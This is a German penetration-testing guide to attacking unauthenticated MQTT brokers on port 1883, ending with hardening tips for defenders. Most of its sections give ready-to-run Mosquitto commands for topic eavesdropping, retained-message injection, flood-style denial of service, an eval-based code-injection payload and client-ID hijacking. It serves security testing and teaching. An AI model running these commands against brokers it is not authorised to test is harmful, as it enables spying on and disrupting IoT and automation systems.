# MQTT

### MQTT-Broker auf Port 1883 – Analyse und Ausnutzung

### 1. Allgemeines

MQTT (Message Queuing Telemetry Transport) ist ein leichtgewichtiges Publish/Subscribe-Protokoll, das häufig in IoT-Umgebungen eingesetzt wird. Ein offener Broker ohne Authentifizierung auf Port 1883 stellt ein potenzielles Sicherheitsrisiko dar, da unautorisierte Akteure ungehindert auf Topics zugreifen, Nachrichten injizieren oder persistente Payloads hinterlassen können.

***

### 2. Analyse

Ein erster Scan kann mit Nmap erfolgen:

```bash
nmap -A -p1883 <IP>
```

Ein offener Port mit Service `mosquitto` zeigt typischerweise die Version des Brokers sowie `$SYS`-Topics an.

Anschließend kann überprüft werden, ob anonyme Verbindungen erlaubt sind:

```bash
mosquitto_sub -h <IP> -p 1883 -t "#" -v
```

Dabei wird das Wildcard-Topic `#` abonniert, um sämtliche verfügbaren Topics und ihre Inhalte zu erfassen.

***

### 3. Testmethoden

**Nachrichten veröffentlichen:**

```bash
mosquitto_pub -h <IP> -p 1883 -t "test/topic" -m "Testnachricht"
```

**Systeminformationen auslesen (falls verfügbar):**

```bash
mosquitto_sub -h <IP> -p 1883 -t "$SYS/#" -v
```

**Retained Messages injizieren:**

```bash
mosquitto_pub -h <IP> -p 1883 -t "alerts/system" -r -m "System offline"
```

**Retained Messages löschen:**

```bash
mosquitto_pub -h <IP> -p 1883 -t "alerts/system" -r -n
```

***

### 4. Potenzielle Angriffsmöglichkeiten

Ein ungesicherter MQTT-Broker (z. B. Mosquitto) ohne Authentifizierung und Zugriffskontrolle bietet eine Vielzahl an Angriffsflächen. Im Folgenden werden die häufigsten und praxisrelevantesten Angriffsmethoden beschrieben.

***

#### 4.1 Unauthentifiziertes Publish/Subscribe

Ein MQTT-Broker, der ohne Zugangskontrolle betrieben wird, erlaubt es, dass sich beliebige Clients verbinden, Topics abonnieren oder Nachrichten veröffentlichen. Das ermöglicht:

* **Lauschangriffe** auf interne Kommunikation
* **Manipulation von Topics**, insbesondere in Automatisierungs- oder IoT-Umgebungen
* **Interaktion mit angebundenen Systemen**, die MQTT als Steuerkanal nutzen

Beispiel:

```bash
mosquitto_sub -h <IP> -p 1883 -t "#" -v
```

Abonnieren aller verfügbaren Topics.

***

#### 4.2 Retained Message Injection

Retained Messages bleiben am Broker gespeichert und werden automatisch an neu verbundene Clients gesendet. Ein Angreifer kann diese Funktion nutzen, um manipulierte oder bösartige Inhalte dauerhaft im System zu verankern.

**Beispiel:**

```bash
mosquitto_pub -h <IP> -p 1883 -t "system/alerts" -r -m "Falscher Alarm: ALLES OK"
```

**Löschen persistenter Nachrichten:**

```bash
mosquitto_pub -h <IP> -p 1883 -t "system/alerts" -r -n
```

Risiken:

* Falschinformationsverbreitung
* Persistenz von Schadcode in IoT-Ökosystemen
* Täuschung von Benutzern und Systemen

***

#### 4.3 Denial of Service (DoS)

MQTT erlaubt schnelles Senden großer Mengen kleiner Nachrichten. Ein Angreifer kann den Broker oder angebundene Clients überlasten:

**Massenpublishing:**

```bash
while true; do
  mosquitto_pub -h <IP> -p 1883 -t "flood" -m "X"
done
```

**Verbindungsflut:**

```bash
for i in {1..1000}; do
  mosquitto_sub -h <IP> -p 1883 -t "x" -i client$i &
done
```

Folgen:

* Ressourcenerschöpfung auf dem Server
* Instabilität oder Ausfall angebundener Dienste
* Verzögerungen oder Nachrichtenverlust

***

#### 4.4 Command Injection über Payload

In einigen Architekturen werden MQTT-Nachrichten direkt in Skripten oder Backend-Systemen weiterverarbeitet. Bei unsachgemäßer Validierung kann dies zur Codeausführung führen (z. B. in Python durch `eval()`):

**Beispielhafte Payload:**

```bash
mosquitto_pub -h <IP> -p 1883 -t "device/cmd" -m "__import__('os').system('id')"
```

Voraussetzung:

* Unsicher implementierte Message-Handler
* Direkte Auswertung von Payloads ohne Input-Filter

Risiko:

* Remote Code Execution (RCE)
* Volle Systemkompromittierung bei Root-Rechten

***

#### 4.5 Informationsbeschaffung über Systemtopics

Systemtopics wie `$SYS/#` liefern interne Informationen über:

* Anzahl aktiver/verbindeter Clients
* Uptime und Speicherauslastung
* Broker-Version

**Beispiel:**

```bash
mosquitto_sub -h <IP> -p 1883 -t "$SYS/#" -v
```

Diese Informationen erleichtern:

* Fingerprinting des Dienstes
* Einschätzung der Serverleistung
* Auswahl geeigneter Exploits (z. B. für alte Mosquitto-Versionen)

***

#### 4.6 Topic-Enumeration & Auslesen sensitiver Daten

Angreifer können durch systematisches Abonnieren und Publishen existierende Topics identifizieren und sensible Daten extrahieren, z. B.:

* Umgebungsdaten (z. B. Sensorwerte, Temperaturen)
* Steuerbefehle an IoT-Geräte
* Authentifizierungs- oder Konfigurationsdaten (bei schlechter Implementierung)

Vorgehen:

```bash
mosquitto_sub -h <IP> -p 1883 -t "#" -v
```

In Verbindung mit gezielter Manipulation kann so die Integrität ganzer Steuer- und Automatisierungsprozesse kompromittiert werden.

***

#### 4.7 Client-Spoofing und Session-Hijacking

Wenn keine Client-ID-Validierung erfolgt, kann ein Angreifer sich mit der gleichen Client-ID wie ein legitimer Nutzer verbinden und diesen "abdrängen", da MQTT standardmäßig keine gleichzeitigen Verbindungen pro Client-ID erlaubt.

**Beispiel:**

```bash
mosquitto_sub -h <IP> -p 1883 -t "#" -i legit_client_id
```

Konsequenzen:

* Übernahme von Steuerverbindungen
* Nachrichtenzwischenfang (Man-in-the-Middle)
* Störung kritischer Prozesse

***

#### 5. Sicherheitsempfehlungen (für Verteidiger)

* Authentifizierung und Autorisierung aktivieren
* Zugriff auf `$SYS/#` einschränken
* Retained Messages kontrollieren und bei Bedarf deaktivieren
* QoS-Regeln und Verbindungsanzahl pro Client limitieren
* TLS-Verschlüsselung aktivieren (Port 8883)
* Logging und Monitoring einsetzen
